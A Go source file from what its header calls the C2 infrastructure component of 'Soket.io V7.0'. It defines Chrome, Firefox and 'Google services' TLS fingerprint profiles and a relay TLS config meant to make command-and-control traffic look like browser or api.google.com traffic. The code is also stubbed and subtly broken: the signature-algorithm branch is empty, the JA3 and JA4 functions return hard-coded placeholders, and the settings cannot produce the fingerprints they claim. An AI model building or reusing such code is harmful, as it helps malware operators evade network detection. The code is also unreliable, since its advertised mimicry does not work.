// Project: Soket.io V7.0
// Module: C2 Component
// Description:  C2 Infrastructure component.


package tls_mimic

import (
	"crypto/tls"
	"fmt"
)

type TLSConfigOption struct {
	MinVersion     uint16
	MaxVersion     uint16
	CipherSuites   []uint16
	CurvePrefs     []tls.CurveID
	SigAlgs        []tls.SignatureScheme
	ClientAuth     tls.ClientAuthType
	ServerName     string
}

func GoogleChromeFingerprint() *TLSConfigOption {
	return &TLSConfigOption{
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
		CurvePrefs: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
			tls.CurveP384,
		},
		SigAlgs: []tls.SignatureScheme{
			tls.ECDSAWithP256AndSHA256,
			tls.PSSWithSHA256,
			tls.PKCS1WithSHA256,
			tls.ECDSAWithP384AndSHA384,
			tls.PSSWithSHA384,
			tls.PKCS1WithSHA384,
			tls.PSSWithSHA512,
			tls.PKCS1WithSHA512,
			tls.PKCS1WithSHA1,
		},
		ClientAuth: tls.NoClientCert,
	}
}

func FirefoxFingerprint() *TLSConfigOption {
	return &TLSConfigOption{
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
		CurvePrefs: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
			tls.CurveP384,
			tls.CurveP521,
		},
		SigAlgs: []tls.SignatureScheme{
			tls.ECDSAWithP256AndSHA256,
			tls.ECDSAWithP384AndSHA384,
			tls.ECDSAWithP521AndSHA512,
			tls.PSSWithSHA256,
			tls.PSSWithSHA384,
			tls.PSSWithSHA512,
			tls.PKCS1WithSHA256,
			tls.PKCS1WithSHA384,
			tls.PKCS1WithSHA512,
			tls.ECDSAWithSHA1,
			tls.PKCS1WithSHA1,
		},
		ClientAuth: tls.NoClientCert,
	}
}

func GoogleServicesFingerprint() *TLSConfigOption {
	config := GoogleChromeFingerprint()
	config.ServerName = "api.google.com"
	return config
}

func ApplyTLSConfig(tlsConfig *tls.Config, opt *TLSConfigOption) error {
	if tlsConfig == nil {
		return fmt.Errorf("tls.Config is nil")
	}

	if opt == nil {
		return fmt.Errorf("TLSConfigOption is nil")
	}

	tlsConfig.MinVersion = opt.MinVersion
	tlsConfig.MaxVersion = opt.MaxVersion

	if len(opt.CipherSuites) > 0 {
		tlsConfig.CipherSuites = opt.CipherSuites
	}

	if len(opt.CurvePrefs) > 0 {
		tlsConfig.CurvePreferences = opt.CurvePrefs
	}

	if len(opt.SigAlgs) > 0 {

	}

	tlsConfig.ClientAuth = opt.ClientAuth

	if opt.ServerName != "" {
		tlsConfig.ServerName = opt.ServerName
	}

	tlsConfig.SessionTicketsDisabled = false

	return nil
}

func CreateRelayTLSConfig(cert tls.Certificate) (*tls.Config, error) {
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		MaxVersion:   tls.VersionTLS13,
	}

	fingerprint := GoogleChromeFingerprint()
	if err := ApplyTLSConfig(tlsConfig, fingerprint); err != nil {
		return nil, fmt.Errorf("failed to apply TLS fingerprint: %w", err)
	}

	tlsConfig.PreferServerCipherSuites = true
	tlsConfig.NextProtos = []string{"h2", "http/1.1"}

	return tlsConfig, nil
}

func GetJA3String(opt *TLSConfigOption) string {

	return fmt.Sprintf("771,Chrome-like-ciphers,0-23-65281-10-11-35-16-5-13-18-51-45-43-27,29-23-24,0")
}

func GetJA4String(opt *TLSConfigOption) string {

	return "t13d1516h2_123456_abcdef"
}
